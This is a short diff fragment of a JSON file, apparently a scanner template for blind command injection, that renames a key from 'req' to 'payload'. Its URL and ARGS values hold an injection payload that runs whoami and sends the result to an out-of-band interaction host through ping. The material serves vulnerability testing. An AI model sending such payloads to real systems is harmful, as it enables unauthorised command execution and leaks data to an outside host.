@@ -1,5 +1,5 @@
 {
-  "req": [
+  "payload": [
     {
       "URL": "$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}})",
       "ARGS": "$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}})",
